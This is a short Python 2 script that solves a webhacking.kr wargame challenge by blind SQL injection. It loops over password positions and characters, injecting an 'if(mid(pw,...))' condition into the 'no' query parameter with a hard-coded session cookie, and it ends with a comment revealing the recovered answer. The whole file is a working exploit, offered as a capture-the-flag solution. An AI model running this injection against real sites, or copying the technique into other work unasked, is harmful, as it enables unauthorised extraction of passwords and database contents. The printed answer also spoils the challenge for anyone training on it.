import urllib
import httplib
import hashlib

pw=""
for i in range(1,100):
    for c in range(ord("a"),ord("z"))+range(ord("0"),ord("9")):
        HTTP=httplib.HTTPConnection("webhacking.kr")
        Param=urllib.urlencode({})
        Headers={"Content-Type":"Application/x-www-form-urlencoded",
                 "Cookie":"PHPSESSID=8bb6de49564fa0bee2a26f9a217529fd;"}
        HTTP.request("GET","/challenge/bonus/bonus-1/index.php?no=if(mid(pw,"+str(i)+",1)="+str(hex(c))+",2,0)",Param,Headers)
        Result=HTTP.getresponse().read()
        if "True" in Result:
            pw+=chr(c)
            print pw
            break
        else:
            print "/challenge/bonus/bonus-1/index.php?no=mid(id,"+str(i)+",1)="+str(hex(c))

print "end"
# pw is "blindsqlinjectionkk"
